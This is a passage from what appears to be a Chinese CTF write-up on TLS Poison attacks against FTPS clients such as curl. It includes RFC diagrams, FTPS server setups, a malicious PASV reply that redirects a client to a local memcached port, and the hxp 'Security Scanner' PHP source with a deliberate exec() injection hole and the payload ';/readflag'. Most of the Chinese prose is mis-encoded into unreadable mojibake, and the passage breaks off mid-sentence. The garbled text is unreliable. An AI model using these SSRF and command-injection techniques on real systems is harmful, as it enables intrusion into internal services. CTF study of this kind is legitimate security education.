PBSZ/PROT, or the server can refuse to allow a PBSZ/PROT pair until the USER/PASS pair has happened). Note 2: The PASS command might not be required at all (if the USER parameter and any client identity presented provide sufficient authentication). The server would indicate this by issuing a '232' reply to the USER command instead of the '331', which requests a PASS from the client (see below). Note 3: The AUTH command might not be the first command after the receipt of the 220 welcome message. æ•°æ®ä¼ è¾“é˜¶æ®µï¼š\n12.6. A Standard Data Transfer with Protection Client Server control data data control ==================================================================== socket() bind() PORT w,x,y,z,a,b --------------------------------------------\u0026gt; \u0026lt;-------------------------------------------------------- 200 STOR file ---------------------------------------------------\u0026gt; socket() bind() \u0026lt;-------------------------------------------------------- 150 accept() \u0026lt;---------- connect() TLSneg() \u0026lt;----------\u0026gt; TLSneg() TLSwrite() ----------\u0026gt; TLSread() TLSshutdown() -------\u0026gt; TLSshutdown() close() ----------\u0026gt; close() \u0026lt;-------------------------------------------------------- 226 12.7. A Firewall-Friendly Data Transfer with Protection Client Server control data data control ==================================================================== PASV --------------------------------------------------------\u0026gt; socket() bind() \u0026lt;------------------------------------------ 227 (w,x,y,z,a,b) socket() STOR file ---------------------------------------------------\u0026gt; connect() ----------\u0026gt; accept() \u0026lt;-------------------------------------------------------- 150 TLSneg() \u0026lt;---------\u0026gt; TLSneg() TLSwrite() ---------\u0026gt; TLSread() TLSshutdown() -------\u0026gt; TLSshutdown() close() ---------\u0026gt; close() \u0026lt;-------------------------------------------------------- 226 TLS Poison In FTPS çœ‹åˆ°å¦‚ä¸Šè§£é‡Šï¼Œæƒ³å¿…å¤§å®¶å¯èƒ½ä¹Ÿä¼šæœ‰æ€è€ƒï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯ FTPS ä¹Ÿä¼šæœ‰ TLS ä¼šè¯é‡ç”¨çš„ç‰¹æ€§å‘¢ï¼Ÿé‚£ä¹ˆæ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥è·Ÿ TLS Poison ç›¸å…³è”èµ·æ¥å‘¢ï¼Ÿ\nExplicit é¦–å…ˆæˆ‘ä»¬æ¥å…ˆçœ‹çœ‹æ‹¥æœ‰ RFC 4217 è§„èŒƒçš„æ˜¾ç¤º FTPS ï¼Œæˆ‘ä»¬å¯ä»¥å€Ÿç”¨ pyftpdlib æ¥åšä¸€ä¸ªç®€å•çš„ FTPS Server\n\u0026#34;\u0026#34;\u0026#34; An RFC-4217 asynchronous FTPS server supporting both SSL and TLS. Requires PyOpenSSL module (http://pypi.python.org/pypi/pyOpenSSL). \u0026#34;\u0026#34;\u0026#34; from pyftpdlib.servers import FTPServer from pyftpdlib.authorizers import DummyAuthorizer from pyftpdlib.handlers import TLS_FTPHandler def main(): authorizer = DummyAuthorizer() # authorizer.add_user(\u0026#39;ftpuser\u0026#39;, \u0026#39;ftpuser123\u0026#39;, \u0026#39;.\u0026#39;, perm=\u0026#39;elradfmwMT\u0026#39;) authorizer.add_anonymous(\u0026#39;.\u0026#39;) handler = TLS_FTPHandler handler.certfile = \u0026#39;keycert.pem\u0026#39; handler.authorizer = authorizer # requires SSL for both control and data channel handler.tls_control_required = True handler.tls_data_required = True server = FTPServer((\u0026#39;\u0026#39;, 11211), handler) server.serve_forever() if __name__ == \u0026#39;__main__\u0026#39;: main() å¯¹äºå®¢æˆ·ç«¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ curl æ¥å‘èµ·ä¸€ä¸ªæ˜¾å¼ FTPS è¯·æ±‚ï¼š\ncurl --ftp-ssl --user name:passwd ftp://ftp.host.com/ å¦‚æœéœ€è¦ç”¨æˆ·éªŒè¯å°±åŠ ä¸Š--useré€‰é¡¹å³å¯ï¼Œä¸éœ€è¦çš„è¯å°±ä¸ç”¨ï¼Œç»“æœå¦‚å›¾æ‰€ç¤ºï¼š\n \næˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°åœ¨æ˜¾å¼ FTPS åœ¨ä½¿ç”¨AUTH SSLå‘½ä»¤ä¹‹åæ‰ä¸æœåŠ¡å™¨å»ºç«‹çš„ TLS è¿æ¥ï¼Œå¹¶åœ¨LISTä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é‡æ–°ä½¿ç”¨äº† TLS Session ã€‚\nè¿™é‡Œæˆ‘ä»¬ç®€å•å›é¡¾ä¸€ä¸‹ï¼Œåœ¨åˆ©ç”¨ HTTPS è¿›è¡Œ TLS Poison æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å†æ¬¡ä½¿ç”¨ HTTP é‡å®šå‘è®©å®¢æˆ·ç«¯é‡æ–°ä¸æˆ‘ä»¬å»ºç«‹ä¼šè¯ï¼Œä½†æ˜¯ä»”ç»†è§‚å¯Ÿ FTPS ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰ä½¿ç”¨ç±»ä¼¼ HTTPS é‡å®šå‘çš„åŠŸèƒ½è®©å…¶å†æ¬¡ä¸ FTPS æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œé‚£ä¸ºä»€ä¹ˆæˆ‘ä»¬åªæ˜¯ç®€å•è®¿é—®ä¸€æ¬¡ FTPS æœåŠ¡å™¨å°±ä¼šäº§ç”Ÿä¼šè¯é‡ç”¨çš„ç°è±¡å‘¢ï¼Ÿ\nè®©æˆ‘ä»¬çœ‹ä¹‹å‰å‘ç”Ÿäº†ä»€ä¹ˆï¼Œå®¢æˆ·ç«¯ä½¿ç”¨äº†EPSVå‘½ä»¤è¡¨ç¤ºä½¿ç”¨ FTP è¢«åŠ¨æ¨¡å¼ï¼ŒFTP æœåŠ¡å™¨ä»¥(||||32949)å¯¹è¯¥å‘½ä»¤è¿›è¡Œäº†å›å¤ã€‚\nè¿™é‡Œæˆ‘ä»¬ç®€å•å›é¡¾ä¸€ä¸‹ FTP çš„è¢«åŠ¨æ¨¡å¼ï¼šåœ¨è¢«åŠ¨æ¨¡å¼çš„ FTP ä¸­ï¼Œå®¢æˆ·ç«¯å¯åŠ¨åˆ°æœåŠ¡å™¨çš„ä¸¤ä¸ªè¿æ¥ï¼Œè§£å†³äº†é˜²ç«å¢™é˜»æ­¢ä»æœåŠ¡å™¨åˆ°å®¢æˆ·ç«¯çš„ä¼ å…¥æ•°æ®ç«¯å£è¿æ¥çš„é—®é¢˜ã€‚FTP è¿æ¥å»ºç«‹åï¼Œå®¢æˆ·ç«¯åœ¨æœ¬åœ°æ‰“å¼€ä¸¤ä¸ªéšæœºçš„éç³»ç»Ÿç«¯å£ N å’Œ N + 1(N \u0026gt; 1023)ã€‚ç¬¬ä¸€ä¸ªç«¯å£è¿æ¥æœåŠ¡å™¨ä¸Šçš„ 21 ç«¯å£ï¼Œä½†æ˜¯å®¢æˆ·ç«¯è¿™æ¬¡å°†ä¼šå‘å‡º PASV å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯ä¸å…è®¸æœåŠ¡å™¨è¿æ¥å›å…¶æ•°æ®ç«¯å£ã€‚è¿™æ ·ï¼ŒæœåŠ¡å™¨éšåä¼šæ‰“å¼€ä¸€ä¸ªéšæœºçš„éç³»ç»Ÿç«¯å£ P (P \u0026gt; 1023)ï¼Œå¹¶å°† P å‘é€ç»™å®¢æˆ·ç«¯ä½œä¸º PASV å‘½ä»¤çš„å“åº”ã€‚ç„¶åå®¢æˆ·ç«¯å¯åŠ¨ä»ç«¯å£ N+1 åˆ°ç«¯å£ P çš„è¿æ¥æ¥ä¼ è¾“æ•°æ®ã€‚å…¶ä¸­EPSVå‘½ä»¤ä¸ºPASVçš„æ›´æ–°ç‰ˆæœ¬ï¼Œä¸»è¦ä¸ºäº†å…¼å®¹ IPv6 è€Œåœ¨ RFC 2428 ä¸­å®šä¹‰çš„ã€‚\n \næ‰€ä»¥åœ¨è¢«åŠ¨æ¨¡å¼ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å€Ÿç”±ä¸Šå›¾æ¸…æ¥šçš„æ˜ç™½ï¼Œåœ¨æ•°æ®ä¼ è¾“é˜¶æ®µï¼Œå®¢æˆ·ç«¯éœ€è¦ä¸æœåŠ¡ç«¯é‡æ–°å»ºç«‹ä¸€æ¬¡è¿æ¥ï¼è€Œåœ¨æ˜¾å¼ FTPS å½“ä¸­ï¼Œé‡æ–°å»ºç«‹è¿æ¥å°±å¯ä»¥é‡æ–°ä½¿ç”¨ TLS ä¼šè¯ï¼Œä¹Ÿå°±æ„å‘³ç€å¯èƒ½è¢« TLS Poison æ”»å‡»ï¼\nImplicit å¯¹äºéšå¼æ¨¡å¼ï¼Œå› ä¸ºä¸€å¼€å§‹å°±éœ€è¦å»ºç«‹ TLS ä¼šè¯ï¼Œæ‰€ä»¥å³ä½¿æ²¡æœ‰ RFC è§„å®šï¼Œç†è®ºä¸Šä¹Ÿå¾ˆæ˜æ˜¾åº”è¯¥ä¹ŸåŒæ ·ä¼šæ”¯æŒ TLS ä¼šè¯é‡ç”¨çš„æœºåˆ¶ã€‚\nè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ vsftpd æ¥è¿›è¡Œç®€å•å®éªŒï¼Œå®‰è£… vsftpd ååœ¨ /etc/vsftp.conf ä¸­å¼€å¯implicit_ssl=YESé€‰é¡¹\nå‚è€ƒé…ç½®ï¼š\nlisten=NO listen_ipv6=YES anonymous_enable=YES local_enable=YES write_enable=YES local_umask=022 anon_root=/var/ftp/ no_anon_password=YES hide_ids=YES dirmessage_enable=YES use_localtime=YES xferlog_enable=YES connect_from_port_20=YES secure_chroot_dir=/var/run/vsftpd/empty pam_service_name=vsftpd pasv_enable=Yes pasv_min_port=10000 pasv_max_port=11000 rsa_cert_file=/home/ubuntu/tls/fullchain.pem rsa_private_key_file=/home/ubuntu/tls/privkey.pem ssl_enable=YES ssl_ciphers=HIGH allow_anon_ssl=YES force_local_data_ssl=YES force_local_logins_ssl=YES ssl_tlsv1=YES ssl_sslv2=NO ssl_sslv3=NO listen_port=11211 implicit_ssl=YES è¯·æŒ‰ç…§å…¶ä»–æ•™ç¨‹ç”³è¯·å¯¹åº”åŸŸåè¯ä¹¦ã€é…ç½®å¥½åŒ¿å ssl è®¿é—® vsftpd ï¼Œå¦åˆ™å¾ˆå®¹æ˜“å¯¼è‡´ vsftpd æŠ¥é”™ï¼Œå¹¶ä¸”æ£€æŸ¥å¥½ vsftpd çŠ¶æ€æ˜¯å¦æˆåŠŸè¿è¡Œã€‚\né…ç½®å¥½ vsftpd åä½¿ç”¨ curl è¿›è¡Œè®¿é—®:\ncurl ftps://exmaple.com -v è¿™é‡Œæˆ‘å¦å¤–å¢åŠ äº†--tls-max 1.2é€‰é¡¹ï¼Œå› ä¸ºåœ¨ TLS 1.3 å½“ä¸­ï¼Œ Session ID ä¼ è¾“åœ¨åŠ å¯†è¿‡ç¨‹ä¸­ï¼Œä¸ä¾¿è§‚å¯Ÿï¼Œè€Œ TLS 1.2 å¯ä»¥åœ¨ Server Hello æ¶ˆæ¯ä¸­çœ‹åˆ° TLS Server è®¾ç½®çš„ Session IDï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨--tls-max 1.2è¿«ä½¿ curl æœ€å¤§ä½¿ç”¨ TLS 1.2 ç‰ˆæœ¬ã€‚\næˆ‘ä»¬å°±å¯ä»¥è§‚å¯Ÿåˆ°å¦‚ä¸‹å›¾æ‰€ç¤ºç°è±¡ï¼š\n \nå¯ä»¥çœ‹åˆ°ä¹Ÿæ˜¯åœ¨ä½¿ç”¨PASVå‘½ä»¤ä¹‹åï¼Œä¹Ÿå°±æ˜¯æ•°æ®ä¼ è¾“é˜¶æ®µæ—¶ï¼Œé‡æ–°ä½¿ç”¨äº† Session ID è¿›è¡Œå»ºç«‹ TLS ä¼šè¯ã€‚\nPASV æ—¢ç„¶ç¡®å®šäº†å¯ä»¥é‡ç”¨ TLS ä¼šè¯ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ DNS Rebinding çš„é—®é¢˜ï¼Œä¹Ÿæ˜¯ TLS Poison æ”»å‡»ä¸­çš„å…³é”®é—®é¢˜ã€‚\nä½†æ˜¯ä¼—æ‰€å‘¨çŸ¥ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿‡å»çš„ä¸€å¹´å½“ä¸­ï¼ŒFTP åœ¨ CTF ä¸­çš„åˆ©ç”¨å‡ºç°å¾—ä¹Ÿç®—æ¯”è¾ƒå¤šçš„äº†ï¼Œåˆ©ç”¨ä¸»åŠ¨ã€è¢«åŠ¨æ¨¡å¼è¿›è¡Œ SSRF ä¹Ÿä¸å¹¶ä¸æ˜¯æ–°é²œçš„ Trick äº†ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬è¿˜å¯ä»¥ FTPS æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯é»˜è®¤å‘é€çš„PASVå‘½ä»¤ç»™äºˆæ¶æ„å›å¤ä¸º227 Entering Passive Mode (127,0,0,1,43,203)ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªç®€å•çš„ â€œDNS Rebindingâ€ æ•ˆæœäº†ã€‚\nä½†æ˜¯ä¼—æ‰€å‘¨çŸ¥ï¼Œè¿™ç§å° Trick åº”è¯¥è¢«è§†ä¸ºä¸€ç§æ¼æ´ï¼Œå› ä¸ºåœ¨è®¾è®¡ä¹‹åˆï¼Œæœ¬æ¥å°±åº”è¯¥å°† FTP å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯è¿›è¡Œç»‘å®šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ— è®º FTP ä½¿ç”¨è¢«åŠ¨è¿˜æ˜¯ä¸»åŠ¨æ¨¡å¼ï¼Œéƒ½åº”è¯¥æ˜¯æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ä¹‹é—´è¿›è¡Œå»ºç«‹æ§åˆ¶æµä¸æ•°æ®æµï¼Œå¹¶ä¸åº”è¯¥ä¸ç¬¬ä¸‰è€…è¿›è¡Œï¼Œå†µä¸”å¦‚æœæ”»å‡»è€…æ¶æ„å°†æ•°æ®æµå®šå‘åˆ°å†…ç½‘ç«¯å£å°±ææ˜“äº§ç”Ÿ SSRF ã€‚\næ‰€ä»¥ï¼ŒFirefox æ—©åœ¨ 2007 å¹´å°±ä¿®å¤äº† FTP å¸¦æ¥çš„è¿™ä¸ªé—®é¢˜ï¼Œå¹¶åˆ†é…äº† CVE ç¼–å·ï¼šCVE-2007-1562 ï¼Œè€Œ curl è¿Ÿè¿Ÿåœ¨ 2020 å¹´æ‰è¢«å‘ç°è¿™ç±»é—®é¢˜å¹¶ä¿®å¤ï¼Œä¹Ÿåˆ†é…äº† CVE ç¼–å·ï¼šCVE-2020-8284ã€‚curl ç‰ˆæœ¬åœ¨ 4.0 ä¸ 7.73.0 ä¹‹é—´éƒ½ä¼šå—åˆ°è¯¥ç§æ¼æ´çš„å½±å“ï¼Œè¯¦è§ï¼štrusting FTP PASV responses\næ‰€ä»¥å¯¹äº FTPS æ¥è¯´ï¼Œåªè¦å­˜åœ¨PASVè¿™ä¸ªæ¼æ´ï¼Œå°±å¯ä»¥éå¸¸æ–¹ä¾¿åœ°ä½¿ç”¨ TLS Poison è¿›è¡Œæ”»å‡»ã€‚å…·ä½“æ­¥éª¤ä¸ºï¼š\n curl è®¿é—® ftps æœåŠ¡å™¨ï¼Œå¹¶ä¸å…¶å»ºç«‹ tls æ¡æ‰‹ ftps æœåŠ¡å™¨åœ¨å»ºç«‹ tls è¿æ¥æ—¶è®¾ç½®æ¶æ„ session id ftps å¯¹äº curl å‘å‡ºçš„pasvå‘½ä»¤è¿”å›(127,0,0,1,43,203)ï¼Œå¹¶ç­‰å¾…æ¥ä¸‹æ¥çš„LISTç­‰å‘½ä»¤ ä¹‹å curl æ‰ä¼šä¸ 127.0.0.1:11211 å°è¯•é‡ç”¨ session id å»ºç«‹ TLS ä¼šè¯  å¥½äº†ï¼Œç†Ÿæ‚‰äº† TLS Poison æ”»å‡»ä»¥åŠç¡®å®š FTPS ä¸¤ä¸ªå½¢å¼éƒ½å¯èƒ½å—åˆ° TLS Poison æ”»å‡»ï¼Œé‚£æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥äº²è‡ªä½“éªŒä¸€ä¸‹åœ¨ CTF å½“ä¸­çš„åº”ç”¨å§ã€‚\nHXP CTF - Security Scanner è¿™æ˜¯æ¥è‡ª 2020 å¹´ hxp CTF å½“ä¸­çš„ä¸€é“ web æ–¹å‘é¢˜ç›®ï¼Œåˆ° hxp æ¯”èµ›ç»“æŸåªæœ‰ä¸¤è§£ï¼Œç®—æ˜¯ä¸€é“æ¯”è¾ƒéš¾çš„é¢˜ç›®ã€‚è¿™ä¸ªé¢˜ç›®å…¶å®æˆ‘å¾ˆæ—©å°±åšå¤ç›˜çš„ä¸€ä¸ªé¢˜ï¼Œåˆ©ç”¨äº†ä»Šå¹´ DEF CON ç­‰ web çš„æ—¶é—´æŠŠè¿™ä¸ªé¢˜åšäº†ä¸€æ¬¡ç®€å•çš„å¤ç›˜ã€‚\nDescription  â€‹\tFinally, after all these years computers are stealing my job.\nTry our new robotic security scanner.\n Author: 0xbb\nä¸»è¦é¢˜ç›®æºç ï¼š\n\u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;sandbox\u0026#39;])) { $id = \u0026#39;\u0026#39;; while(strlen($id) \u0026lt; 10) { $b = random_bytes(1); if(ord($b) \u0026gt; 32 \u0026amp;\u0026amp; ord($b) != 0x7f) { $id .= $b; } } $_SESSION[\u0026#39;sandbox\u0026#39;] = $id; } echo \u0026#39;\u0026lt;h1\u0026gt;Sandbox\u0026lt;/h1\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;code\u0026gt;\u0026#39;.base64_encode($_SESSION[\u0026#39;sandbox\u0026#39;]).\u0026#39;\u0026lt;/code\u0026gt;\u0026#39;; $m = new Memcached(); $m-\u0026gt;addServer(\u0026#39;127.0.0.1\u0026#39;, 11211); $url = strval($_GET[\u0026#39;url\u0026#39;]); if ($m-\u0026gt;get($_SESSION[\u0026#39;sandbox\u0026#39;].$url) !== \u0026#39;OK\u0026#39;) { if(preg_match(\u0026#39;/^[0-9a-zA-Z:\\.\\/-]{1,64}$/\u0026#39;, $url) !== 1) { die(\u0026#39;security :(\u0026#39;); } $git_check = \u0026#34;001e# service=git-upload-pack\\n\u0026#34;; $data = file_get_contents($url .\u0026#39;/info/refs?service=git-upload-pack\u0026#39;); if ($data === FALSE || substr($data, 0, strlen($git_check)) !== $git_check) { die(\u0026#34;doesn\u0026#39;t look like git :(\u0026#34;); } $m-\u0026gt;set($_SESSION[\u0026#39;sandbox\u0026#39;].$url, \u0026#39;OK\u0026#39;, time() + 300); } $output = []; $return_var = 1; exec(\u0026#34;timeout -s KILL 3 git ls-remote --tags -- $url\u0026#34;, $output, $return_var); if($return_var !== 0) { die(\u0026#39;analysis failed :(\u0026#39;); } echo \u0026#39;\u0026lt;h1\u0026gt;Analysis\u0026lt;/h1\u0026gt;\u0026#39;; echo \u0026#34;URL: ${url}\u0026#34;; echo \u0026#39;\u0026lt;h2\u0026gt;Tags\u0026lt;/h2\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;ul\u0026gt;\u0026#39;; foreach($output as $l) { echo \u0026#34;\u0026lt;li\u0026gt;\u0026lt;code\u0026gt;${l}\u0026lt;/code\u0026gt;\u0026lt;/li\u0026gt;\u0026#34;; } echo \u0026#39;\u0026lt;/ul\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;h2\u0026gt;Result\u0026lt;/h2\u0026gt;\u0026#39;; if(TRUE) { // patented algorithm (tm)  echo \u0026#39;Likely insecure :(\u0026#39;; } Analyze å®¡è®¡ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºä»£ç æ‰§è¡Œçš„ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š\n ç”Ÿæˆéšæœºå­—ç¬¦ä¸²åš SANDBOX ç”¨æˆ·è¾“å…¥ url åï¼Œä» Memecached ä¸­è·å–é”®å€¼ä¸º SANDBOX + url çš„ Value å€¼ï¼Œåˆ¤æ–­æ˜¯å¦ä¸º \u0026ldquo;OK\u0026rdquo;  å¦‚æœä¸æ˜¯ï¼Œé€šè¿‡^[0-9a-zA-Z:\\.\\/-]{1,64}$æ­£åˆ™åï¼Œé€šè¿‡file_get_contentsè®¿é—®$url .'/info/refs?service=git-upload-pack'ï¼Œæ£€æŸ¥ç»“æœæ˜¯å¦ä»¥001e# service=git-upload-pack\\nå¼€å¤´  å¦‚æœä¸æ˜¯ä»¥001e# service=git-upload-pack\\nå¼€å¤´ï¼Œåˆ™ç»“æŸç¨‹åº å¦‚æœæ˜¯ï¼Œåˆ™ä¼šåœ¨ Memecached ä¸­å°†é”®å€¼ä¸º SANDBOX + url çš„ Value å€¼è®¾ç½®ä¸º \u0026ldquo;OK\u0026rdquo;ï¼Œæ—¶é—´ä¸º 5min   å¦‚æœæ˜¯ \u0026ldquo;OK\u0026rdquo; ï¼Œåˆ™ä¼šä½¿ç”¨execæ‰§è¡Œå‘½ä»¤timeout -s KILL 3 git ls-remote --tags -- $urlï¼Œå¦‚æœè®¿é—®æˆåŠŸåˆ™è¾“å‡ºå“åº”    æ•´ä¸ªä»£ç æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n \nSolution 1 From: https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner\næˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ç¬¬ä¸€ç§è§£æ³•ï¼Œè¿™ä¹Ÿæ˜¯ perfect guesser ä»–ä»¬ä½¿ç”¨çš„ç±»ä¼¼è§£æ³•ï¼Œé€šè¿‡ HTTPS æ¥è¿›è¡Œè§£é¢˜ã€‚\né¢˜ç›®å”¯ä¸€ä¸€å¤„å¯ä»¥è®©æˆ‘ä»¬ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹å°±æ˜¯execå¤„äº†ï¼Œæ‰€ä»¥å¦‚æœæ²¡æœ‰å…¶ä»–æ ¡éªŒéªŒè¯çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤æ³¨å…¥è¿›è¡Œ RCE ï¼Œä¾‹å¦‚ä¼ å…¥url=;/readflagï¼Œè¿™æ ·é¢˜ç›®æ‰§è¡Œé¡ºåºå¦‚ä¸‹æµç¨‹å›¾æ‰€ç¤ºï¼š\n \nè¿™æ ·é¢˜ç›®åœ¨æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤æ—¶ï¼Œå°±ä¹Ÿä¼šæŠŠå›æ˜¾æ˜¾ç¤ºç»™æˆ‘ä»¬äº†ï¼Œä¹Ÿå°±æ‹¿åˆ° FLAG äº†ã€‚\næ—¢ç„¶æœ€åä¸€æ­¥æˆ‘ä»¬çŸ¥é“äº†ï¼Œæˆ‘ä»¬å°±å¾—æƒ³åŠæ³•å¦‚æœç»•è¿‡å‰é¢çš„éªŒè¯æ­¥éª¤ã€‚ä¸»è¦éªŒè¯ä¹Ÿå°±æ˜¯å¦‚ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼š\n æ­£åˆ™è¡¨è¾¾å¼ï¼š^[0-9a-zA-Z:\\.\\/-]{1,64}ã€‚è¡¨è¾¾å¼æ¯”è¾ƒä¸¥æ ¼ï¼Œçœ‹èµ·æ¥å¹¶æ²¡æœ‰ä»€ä¹ˆå¯ä»¥è®©æˆ‘ä»¬è¿›è¡Œå‘½ä»¤æ³¨å…¥çš„æœºä¼šã€‚ å³ä½¿ç»•è¿‡äº†æ­£åˆ™ï¼Œä½†æ˜¯file_get_contentså¹¶ä¸ä¼šè®¤ä¸º;/readflagæ˜¯åˆæ³•åè®®ï¼Œä¹Ÿä¸èƒ½æ¥ç€å»æ‰§è¡Œã€‚  æ‰€ä»¥é—®é¢˜å°±æ¥åˆ°äº†å¦‚ä½•å°†æˆ‘ä»¬çš„ payload å†™å…¥ memcached å½“ä¸­ä»¥åŠæˆ‘ä»¬å¦‚ä½•ç»•è¿‡å‰é¢ä¸¤ä¸ªæ­£åˆ™ã€‚\næ—¢ç„¶æ˜¯è¦å†™å…¥ memcached æˆ‘ä»¬ä¸éš¾æƒ³åˆ° 2020 å¹´ black hat ä¸Šçš„è®®é¢˜ When TLS Hack You ï¼Œå…¶ä¸­ä½œè€…ä½¿ç”¨çš„ demo å°±æ˜¯é€šè¿‡ TLS é…åˆ DNS Rebinding æ¥å¯¹ memcached å‘èµ· SSRF æ”»å‡»ï¼Œæ‰€ä»¥å¦‚ä½•å°†æˆ‘ä»¬çš„ payload å†™å…¥åˆ° memcached å½“ä¸­åŸºæœ¬æœ‰äº†ä¸ªå¤§è‡´çš„æ€è·¯ï¼Œé—®é¢˜æ˜¯å¦‚ä½•å®ç°åˆ©ç”¨è¿™ä¸ªæ€è·¯å‘¢ï¼Ÿ\næˆ‘ä»¬å†æ¥çœ‹çœ‹å¦‚æœçœŸæ˜¯ä½¿ç”¨ TLS Poison æ”»å‡»çš„è¯ï¼Œä½¿ç”¨ HTTPS æ˜¯ä¸æ˜¯å°±å¯ä»¥æ»¡è¶³ä»¥ä¸Šä¸¤ä¸ªé™åˆ¶çš„æ¡ä»¶äº†å‘¢ï¼Ÿç¡®å®å¦‚æ­¤ï¼Œhttps://å¹¶æ²¡æœ‰ä½¿ç”¨å…¶ä»–ç¦æ­¢çš„å­—ç¬¦ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡ HTTPS è®©é¢˜ç›®çš„file_get_contentså¾—åˆ°ä»»æ„å†…å®¹ï¼ŒåŒ…æ‹¬æ»¡è¶³ä»–æ‰€éœ€è¦çš„001e# service=git-upload-pack\\nè¿™ä¸ªæ¡ä»¶ã€‚\næ‰€ä»¥ä¼¼ä¹çœ‹èµ·æ¥ TLS Poison æ­£æ˜¯è¿™ä¸ªé¢˜ç›®çš„å…³é”®ï¼å¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦ç¡®å®šï¼Œæˆ‘ä»¬åº”è¯¥ä½¿ç”¨ file_get_contentsè¿˜æ˜¯ git æ¥è¿›è¡Œæ“ä½œå‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´å“ªä¸€ä¸ªæ”¯æŒ TLS ä¼šè¯é‡ç”¨è¿™ä¸ªç‰¹æ€§å‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“file_get_contentså¹¶æ²¡æœ‰ä¾èµ– libcurl ï¼Œæˆ‘ä»¬å¦‚æœç›´æ¥æŸ¥çœ‹ PHP æºä»£ç æœ‰ç‚¹éº»çƒ¦ï¼Œä¸å¦‚ç›´æ¥é€šè¿‡è®©å…¶è®¿é—®æˆ‘ä»¬ TLS Poison Demo æ¥æµ‹è¯•ï¼Œå¦‚æœèƒ½æœ‰æ”¯æŒ TLS ä¼šè¯é‡ç”¨ï¼Œåœ¨ 302 æ—¶ï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒæ¬¡è®¿é—®æˆ‘ä»¬ TLS Server å³ä¼šå¸¦ä¸Š Session ID ï¼Œè¿™ä¸ªæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨wireshark æœ¬åœ°æŠ“åŒ…å³å¯çœ‹åˆ°äº†ã€‚ä½†æ˜¯ç»è¿‡æµ‹è¯•å…¶å®æˆ‘ä»¬å¯ä»¥çœ‹åˆ°file_get_contentså¹¶æ²¡æœ‰åœ¨ç¬¬äºŒæ¬¡ TLS ä¼šè¯æ—¶é‡ç”¨ Session IDï¼Œå¦‚å›¾æ‰€ç¤ºï¼š\n \næ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å°±åªèƒ½å¯„å¸Œæœ›äº git äº†ï¼Œé‚£ä¹ˆ git æ˜¯å¦æ”¯æŒ TLS é‡ç”¨ä¼šè¯ï¼Ÿæ€ä¹ˆç¡®å®š git æ˜¯å¦æ”¯æŒ TLS ä¼šè¯é‡ç”¨å‘¢ï¼Ÿæˆ‘ä»¬èƒ½ä¸èƒ½ç¡®å®š git ä½¿ç”¨çš„æ˜¯ä»€ä¹ˆç½‘ç»œè¯·æ±‚èµ„æºä¾èµ–åº“å‘¢ï¼Ÿæ¯”å¦‚ libcurl ï¼Ÿå¦‚æœæ˜¯ libcurl ï¼Œæˆ‘ä»¬å°±å¥½åŠäº†ï¼Œå› ä¸ºæ˜ç¡®çŸ¥é“ libcurl å¯¹äº HTTPS çš„æ”¯æŒæ˜¯å¯ä»¥æ”¯æŒä¼šè¯é‡ç”¨çš„ï¼Œè‡³å°‘å¯¹äº OpenSSL æˆ–è€… GnuTLS æ¥è¯´ï¼Œéƒ½æ˜¯æ”¯æŒæ­¤é¡¹ç‰¹æ€§çš„ã€‚\né‚£ä¹ˆåˆ°åº•å¦‚ä½•ç¡®å®šå‘¢ï¼Ÿè¿™æœ‰ç‚¹ç±»ä¼¼äºæ‰¾ä¸€ä¸ªç«™ç‚¹ä½¿ç”¨äº†ä»€ä¹ˆ web æ¡†æ¶ï¼Œä¸€èˆ¬æ¥è¯´æˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡æ‰¾ç«™ç‚¹ç‰¹å¾ã€æŠ¥é”™å›æ˜¾ç­‰æ–¹å¼æ¥ç¡®å®šï¼Œä½†æ˜¯ git å‘èµ·ç½‘ç»œè¯·æ±‚çš„ User-Agent ä¸­åªå¸¦äº†å®ƒè‡ªå·±çš„ UA ç‰¹å¾ï¼Œå¹¶æ²¡æœ‰æ˜¾ç¤ºæ˜¯å¦ä½¿ç”¨ 